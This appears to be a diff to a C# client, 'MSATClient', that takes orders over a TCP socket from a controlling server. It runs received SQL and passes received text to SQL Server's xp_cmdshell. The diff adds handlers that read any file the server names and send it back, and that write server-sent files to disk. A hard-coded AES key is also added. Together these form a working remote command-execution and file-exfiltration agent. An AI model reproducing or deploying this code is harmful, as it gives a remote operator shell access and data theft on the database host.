@@ -4,6 +4,7 @@ using System.Data;
 using System.Data.SqlClient;
 using System.Globalization;
 using System.IO;
+using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 using System.Runtime.Serialization;
@@ -171,30 +172,57 @@ namespace MSATClient
                     try
                     {
                         int length = tcpClient.Receive(data);
-                        byte thisLenFlag = 1;
-                        //getmess = Encoding.UTF8.GetString(data,3,length-3);
-                        getmess = Encoding.UTF8.GetString(data, 0, length);  //调试
-                        String allFlag = getmess.Substring(0, 3);
+                        getmess = Encoding.UTF8.GetString(data, 0, length);  
+                        int thisLenFlag = getmess.Length;
+                        String filePath = "";
+                        String allFlag = getmess.Substring(0, 12);
                         char firstFlag = allFlag[0];
-                        int lenFlag = Scale.ToInt32(allFlag.Substring(1, 2));
+                        //int lenFlag = Scale.ToInt32(allFlag.Substring(1, 2));
+                        int lenFlag = Convert.ToInt32(allFlag.Substring(1));
+                        Console.WriteLine(DateTime.Now.ToString("MM-dd HH:mm:ss  ") + "(本数据包长度为：" + thisLenFlag + "；标志位：" + firstFlag + "；数据包总长度：" + lenFlag + "): " + getmess);
                         //Console.WriteLine(getmess);
-                        String mess = UnicodeToString(getmess.Replace(allFlag, ""));
+                        String mess = UnicodeToString(getmess.Substring(12));
                         //Console.WriteLine(getmess+"99999");
                         //getmess = getmess.Substring(0,50);
                         //getmess = RSADecrypt(getmess);
-                        while (lenFlag >= thisLenFlag)
+                        while (lenFlag > thisLenFlag)
+                        //while (flag)
+                        {
+                            length = tcpClient.Receive(data);
+                            getmess = Encoding.UTF8.GetString(data, 0, length);
+                            thisLenFlag += getmess.Length;
+                            if (firstFlag == '0' || firstFlag == '1' || firstFlag == '2' || firstFlag == '3' || firstFlag == '4')
+                                mess += getmess;
+                            /**else if (firstFlag == '4')
+                            {
+                                string pattern = @"\n[\d]{12}\$GabgM";
+                                string replacement = "\n";
+                                Regex rgx = new Regex(pattern);
+                                string result = rgx.Replace(getmess, replacement);
+                                mess += result;
+                            }**/
+                            else
+                                mess += UnicodeToString(getmess);
+                            //thisLenFlag++;
+                            if (mess.Length < 40)
+                                Console.WriteLine(DateTime.Now.ToString("MM-dd HH:mm:ss  ") + "(本数据包长度为：" + thisLenFlag + "；标志位：" + firstFlag + "；数据包总长度：" + lenFlag + "): " + mess);
+                            else
+                                Console.WriteLine(DateTime.Now.ToString("MM-dd HH:mm:ss  ") + "(本数据包长度为：" + thisLenFlag + "；标志位：" + firstFlag + "；数据包总长度：" + lenFlag + "): " + mess.Substring(0, 35));
+                        }
+                        /**while (lenFlag >= thisLenFlag)
                         {
                             length = tcpClient.Receive(data);
                             getmess = Encoding.UTF8.GetString(data, 0, length);
                             mess += UnicodeToString(getmess);
                             thisLenFlag++;
-                        }
-                        Console.WriteLine(DateTime.Now.ToString("MM-dd HH:mm:ss  ") + "(字符长度为：" + mess.Length + "；标志位：" + firstFlag + "): " + mess);
+                        }**/
+                        //Console.WriteLine(DateTime.Now.ToString("MM-dd HH:mm:ss  ") + "(字符长度为：" + mess.Length + "；标志位：" + firstFlag + "): " + mess);
                         if (firstFlag == '0')
                         {
                             conn = SqlInfo(tcpClient, conn, mess);
                         }
-                        else if (firstFlag == '2') {
+                        else if (firstFlag == '2')
+                        {
                             try
                             {
                                 //SqlCommand command = new SqlCommand(mess, conn);
@@ -237,46 +265,11 @@ namespace MSATClient
                                 }
                                 //Console.WriteLine(result);
                                 SendMess(tcpClient, result, "2");
-                                /**uint columnsnum = 0;
-                                uint rownum = 0;
-                                foreach (DataTable dt in dataSet.Tables)
-                                {
-                                    mess = "";
-                                    foreach (DataColumn dc in dt.Columns) //遍历所有的列
-                                    {
-                                        mess = mess + dc.ColumnName + "_;,";
-                                        columnsnum++;
-                                    }
-                                    mess = mess + "\r\n";
-                                    foreach (DataRow dr in dt.Rows) ///遍历所有的行
-                                    {
-                                        dr.ToString();
-                                         foreach (DataColumn dc in dt.Columns) //遍历所有的列
-                                        {
-                                            mess = mess + dr[dc] + "_;,";
-                                        }
-                                        mess = mess + "\r\n";
-                                        rownum++;
-                                    }
-                                    mess = columnsnum.ToString() + "_;,_" + rownum.ToString() + "_;,_" + mess;
-                                    SendMess(tcpClient, mess, "2");
-                                }**/
                             }
                             catch (Exception ex)
                             {
                                 SendMess(tcpClient, mess + "\r\n" + ex.Message, "a");
                             }
-                                /**Byte[] sqlResult = GetStringFormatDataSet(dataSet);
-                                SendMess(tcpClient,Convert.ToString(sqlResult.Length),"2");
-                                try
-                                {
-                                    tcpClient.Send(sqlResult);
-                                }
-                                catch (Exception ex)
-                                {
-                                    Console.WriteLine("TcpServer出现异常：" + ex.Message + "\r\n请重新打开服务端程序创建新的连接", "断开连接");
-                                    System.Environment.Exit(0);
-                                }**/
                         }
                         else if (firstFlag == '3')
                         {
@@ -286,18 +279,18 @@ namespace MSATClient
                             }
                             else
                             {
-                            try
-                            {
-                                SqlDataAdapter reader = new SqlDataAdapter("exec xp_cmdshell '" + mess + "'", conn);
-                                DataSet dataSet = new DataSet();
-                                reader.Fill(dataSet, "SQL");
-                                mess = dataSet.GetXml();
-                                SendMess(tcpClient, mess, "3");
-                            }
-                            catch (Exception ex)
-                            {
-                                SendMess(tcpClient, ex.Message, "b");
-                            }
+                                try
+                                {
+                                    SqlDataAdapter reader = new SqlDataAdapter("exec xp_cmdshell '" + mess + "'", conn);
+                                    DataSet dataSet = new DataSet();
+                                    reader.Fill(dataSet, "SQL");
+                                    mess = dataSet.GetXml();
+                                    SendMess(tcpClient, mess, "3");
+                                }
+                                catch (Exception ex)
+                                {
+                                    SendMess(tcpClient, ex.Message, "b");
+                                }
                             }
                         }
                         else if (firstFlag == '4')
@@ -307,6 +300,73 @@ namespace MSATClient
                                 p.StandardInput.WriteLine(" ");
                             p.StandardInput.AutoFlush = true;
                         }
+                        else if (firstFlag == '5')
+                        {
+                            filePath = mess;
+                            FileStream fsRead = new FileStream(filePath, FileMode.Open);
+                            long fileLength = fsRead.Length;
+                            SendMess(tcpClient, Path.GetFileName(filePath) + "," + fileLength.ToString(), "5");
+                            byte[] Filebuffer = new byte[1024 * 1024 * 3];//定义5MB的缓存空间（1024字节(b)=1千字节(kb)）
+                            int readLength = 1024 * 1024 * 3;  //定义读取的长度
+                            //bool firstRead = true;//定义首次读取的状态
+                            long sentFileLength = 0;//定义已发送的长度
+
+                            while (readLength > 0 && sentFileLength < fileLength)
+                            {
+                                if ((fileLength - sentFileLength) < 1024 * 1024 * 3)
+                                {
+                                    readLength = (int)(fileLength - sentFileLength);
+                                }
+                                sentFileLength += readLength;//计算已读取文件大小
+                                                             //第一次发送的字节流上加个前缀1
+                                fsRead.Read(Filebuffer, 0, readLength);
+                                /**if (firstRead)
+                                {
+                                    byte[] firstBuffer = new byte[readLength];//这个操作同样也是用来标记文件的
+                                    //firstBuffer[0] = 1;//将第一个字节标记成1，代表为文件
+                                    Buffer.BlockCopy(Filebuffer, 0, firstBuffer, 1, readLength);//偏移复制字节数组
+                                    tcpClient.Send(firstBuffer, 0, readLength , SocketFlags.None);
+                                    //Console.WriteLine("第一次读取数据成功，在前面添加一个标记");//发送文件数据包
+                                    firstRead = false;//切换状态，避免再次进入
+                                    continue;
+                                }**/
+                                tcpClient.Send(Filebuffer, 0, readLength, SocketFlags.None);//继续发送剩下的数据包
+                                Console.WriteLine("{0}: 已发送数据：{1}/{2}", tcpClient.RemoteEndPoint, sentFileLength, fileLength);//查看发送进度
+                            }
+                            fsRead.Close();//关闭文件流
+                        }
+                        else if (firstFlag == '6')
+                        {
+                            String filename = "";//Path.GetFileName(ClientFilePathTextEdit.Text);
+                            String[] clientInfo = mess.Split(',');
+                            filename = clientInfo[0];
+                            long fileLength = Convert.ToInt64(clientInfo[1]);
+                            byte[] Filebuffer = new byte[1024 * 1024 * 3];
+                            if (filename == clientInfo[0])
+                            {
+                                //String savePath = System.Windows.Forms.Application.StartupPath + "\\" + filename;
+                                String savePath = filename;
+                                int rec = 0;//定义获取接受数据的长度初始值
+                                long recFileLength = 0;
+                                //bool firstWrite = true;
+                                using (FileStream fs = new FileStream(savePath, FileMode.Create, FileAccess.Write))
+                                {
+                                    //ClientFilePathTextEdit.Text = tcpClient.RemoteEndPoint + "; 开始下载！ 文件数据大小：" + fileLength;
+                                    while (recFileLength < fileLength)//判断读取文件长度是否小于总文件长度
+                                    {
+                                        rec = tcpClient.Receive(Filebuffer);//继续接收文件并存入缓存
+                                        fs.Write(Filebuffer, 0, rec);//将缓存中的数据写入文件中
+                                        fs.Flush();//清空缓存信息
+                                        recFileLength += rec;//继续记录已获取的数据大小
+                                        Console.WriteLine("{0}: 已接收数据：{1}/{2}", tcpClient.RemoteEndPoint, recFileLength, fileLength);//查看已接受数据进度
+                                    }
+                                    fs.Close();
+                                    Console.WriteLine("下载完成！路径为：{0}", savePath);//查看已接受数据进度
+                                }
+                            }
+                            SendMess(tcpClient,"\r\n" + filename + "上传成功！","6");
+                        }
+
                     }
                     catch (Exception ex)
                     {
@@ -314,6 +374,7 @@ namespace MSATClient
                         //setClientStatus(false);
                         Console.WriteLine("接收消息：TcpServer出现异常：" + ex.Message + "\r\n请重新打开服务端程序创建新的连接", "断开连接");
                         Console.WriteLine("接收消息退出时的ClientStatus为：" + statusTcp);
+                        Console.WriteLine(DateTime.Now.ToString("MM-dd HH:mm:ss  ") + "本数据包为: " + getmess);
                         setClientStatus(false);
                         //p.WaitForExit();//等待程序执行完退出进程
                         //p.StandardInput.WriteLine(" ");
@@ -425,22 +486,6 @@ namespace MSATClient
                 Console.WriteLine("标识位为：" + flag + getLength(mess.Length) + "；实际大小：" + mess.Length);
                 sendmess = Encoding.UTF8.GetBytes(mess);
                 tcpClient.Send(sendmess);
-                /**for (int i = 0; i < datanum; i++)
-                {
-                    String send = "";
-                    if ((datanum-i) == 1)
-                        send = mess.Substring(i*1024*1024*1);
-                    else
-                        send = mess.Substring(i * 1024 * 1024 * 1,1024*1024*1);
-                    //Console.WriteLine(Encoding.UTF8.GetString(sendmess));
-                    sendmess = Encoding.UTF8.GetBytes(send);
-                    Console.WriteLine("字符长度：" + send.Length + "；第" + i + "个数据包");
-                    tcpClient.Send(sendmess);
-                }**/
-                //Console.WriteLine(mess);
-                //byte[] sendmess = Encoding.UTF8.GetBytes(mess);
-                //Console.WriteLine(Encoding.UTF8.GetString(sendmess));
-                //tcpClient.Send(sendmess);
             }
             catch (Exception ex)
             {
@@ -461,7 +506,6 @@ namespace MSATClient
             return strLength;
         }
 
-        //标识符为0
         public static SqlConnection SqlInfo(Socket tcpClient,SqlConnection conn, String mess)
         {
             //conn = new SqlConnection("Server=.;Database=master;uid=sa;pwd=");
@@ -476,7 +520,7 @@ namespace MSATClient
                 //uid:数据库用户名，一般为sa
                 //pwd：数据库密码
                 //conn = new SqlConnection("Server=.;Database=master;uid=sa;pwd=" + mess);
-                conn = new SqlConnection(mess);
+                //conn = new SqlConnection(mess);
                 /**String[] info = mess.Split(',');
                 if (info[0] == "")
                     info[0] = ".";
@@ -620,6 +664,28 @@ namespace MSATClient
             }
             return uniString;
             //return sb.ToString();
+        }
+
+        /// <summary>
+        /// 解密
+        /// </summary>
+        /// <param name="array">要解密的 byte[] 数组</param>
+        /// <param name="key"></param>
+        /// <returns></returns>
+        public static byte[] Decrypt(byte[] array)
+        {
+            String key = "YGabgMMgbaGGabgMMgbaGGabgMMgbaGY";//FmtPassword(key);
+            byte[] keyArray = UTF8Encoding.UTF8.GetBytes(key);
+
+            RijndaelManaged rDel = new RijndaelManaged();
+            rDel.Key = keyArray;
+            rDel.Mode = CipherMode.ECB;
+            rDel.Padding = PaddingMode.PKCS7;
+
+            ICryptoTransform cTransform = rDel.CreateDecryptor();
+            byte[] resultArray = cTransform.TransformFinalBlock(array, 0, array.Length);
+
+            return resultArray;
         }
 
     }
